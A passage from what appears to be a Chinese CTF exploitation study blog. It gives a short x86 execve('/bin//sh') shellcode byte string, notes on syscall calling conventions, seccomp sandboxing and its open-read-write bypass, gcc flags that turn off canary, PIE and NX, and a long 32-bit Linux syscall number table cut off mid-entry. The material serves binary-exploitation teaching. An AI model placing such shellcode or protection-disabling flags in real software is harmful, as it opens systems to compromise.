class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>32位：</strong></p><blockquote><p>传参方式：首先将系统调用号传入eax，然后将参数从左到右依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器。<br>调用方式: 使用 int 80h 中断进行系统调用</p></blockquote><p><strong>64位：</strong></p><blockquote><p>传参方式：首先将系统调用号传入rax，然后将参数从左到右依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器。<br>调用方式: 使用 syscall 进行系统调用</p></blockquote><h1 id="0x06-沙箱保护"><a href="#0x06-沙箱保护" class="headerlink" title="0x06 沙箱保护"></a>0x06 沙箱保护</h1><p>沙箱保护是一种内核的安全机制，可以禁用一些系统调用，这样可以使程序更加安全。</p><p>Seccomp(全称：secure computing mode)在2.6.12版本(2005年3月8日)中引入linux内核，将进程可用的系统调用限制为四种：read，write，_exit，sigreturn。在这种模式下除了已打开的文件描述符和允许的四种系统调用，如果尝试其他系统调用，内核就会使用SIGKILL或SIGSYS终止该进程。</p><p><a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>可以在pwn中分析沙箱保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./a.out </span><br><span class="line"><span class="comment"># 可以查看过滤规则</span></span><br></pre></td></tr></table></figure><p>seccomp在ctf中大多用于禁用execve函数，解决办法就是构造shellcode，用open-&gt;read-&gt;write的方式读flag</p><h1 id="0x07-gcc编译环境"><a href="#0x07-gcc编译环境" class="headerlink" title="0x07 gcc编译环境"></a>0x07 gcc编译环境</h1><p><strong>gcc</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-fno-stack-protector  关闭canary保护</span><br><span class="line">-fstack-protector     开启canary保护</span><br><span class="line">-no-pie               关闭pie保护</span><br><span class="line">-z execstack          关闭nx保护</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux系统调用表</title>
      <link href="/2021/05/23/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2021/05/23/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>x86平台32位Linux系统调用号</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit         1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork         2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read         3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write        4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open         5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close        6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid         7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat        8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link         9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink      10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve      11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir       12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time        13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod       14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod       15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown      16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_break       17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldstat         18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek       19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid      20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mount       21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount      22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid      23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid      24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stime       25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ptrace      26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm       27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldfstat        28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause       29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utime       30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stty        31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gtty        32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access      33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nice        34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftime       35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync        36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill        37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rename      38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdir       39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rmdir       40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup         41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe        42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_times       43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prof        44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk         45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid      46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid      47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signal      48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid         49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid         50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_acct        51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount2         52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lock        53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl       54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl       55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mpx         56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpgid         57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ulimit      58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldolduname     59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umask       60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chroot      61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ustat       62</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2         63</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getppid         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgrp         65</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsid       66</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaction       67</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sgetmask        68</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ssetmask        69</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid        70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid        71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigsuspend      72</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigpending      73</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sethostname     74</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setrlimit       75</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrlimit       76 <span class="comment">/* Back compatible 2Gig limited rlimit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrusage       77</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday    78</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_settimeofday    79</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups       80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups       81</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select      82</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlink         83</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldlstat        84</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlink        85</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uselib      86</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapon      87</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_reboot      88</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readdir         89</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap        90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap      91</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate        92</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate       93</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmod      94</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown      95</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpriority     96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpriority     97</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_profil      98</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs      99</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs        100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioperm     101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketcall     102</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syslog    103</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer      104</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer      105</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat       106</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat      107</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat      108</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_olduname       109</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_iopl       110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vhangup        111</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_idle       112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vm86old        113</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4      114</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapoff        115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysinfo        116</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ipc        117</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsync      118</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigreturn      119</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone      120</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setdomainname  121</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uname      122</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_modify_ldt     123</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_adjtimex       124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect       125</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigprocmask    126</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_create_module  127</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_init_module    128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_delete_module  129</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_kernel_syms130</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_quotactl       131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgid        132</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchdir     133</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bdflush        134</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysfs      135</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_personality    136</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_afs_syscall    137 <span class="comment">/* Syscall for Andrew File System */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid       138</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid       139</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__llseek        140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents       141</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__newselect     142</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flock      143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync      144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv      145</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev     146</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsid     147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fdatasync      148</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__sysctl        149</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock      150</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlock        151</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlockall       152</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlockall     153</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setparam     154</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getparam     155</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setscheduler     156</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getscheduler     157</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield        158</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_rr_get_interval  161</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep      162</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap     163</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid      164</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid      165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vm86       166</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_query_module   167</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll       168</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nfsservctl     169</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid      170</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid      171</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prctl          172</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn   173</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction   174</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigpending  176</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigtimedwait    177</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigqueueinfo    178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigsuspend  179</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64        180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64       181</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown      182</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcwd     183</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capget     184</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capset     185</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaltstack    186</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile       187</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpmsg        188 <span class="comment">/* some people actually want streams */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_putpmsg        189 <span class="comment">/* some people actually want streams */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork      190</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ugetrlimit     191 <span class="comment">/* SuS compliant getrlimit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap2      192</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate64     193</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate64    194</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat64     195</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat64        196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat64        197</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown32       198</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid32       199</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid32       200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid32      201</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid32      202</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid32     203</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid32     204</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups32    205</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups32    206</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown32       207</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid32    208</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid32    209</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid32    210</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid32    211</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown32        212</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid32       213</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid32       214</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid32     215</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid32     216</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pivot_root     217</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore        218</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise        219</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise1       219 <span class="comment">/* 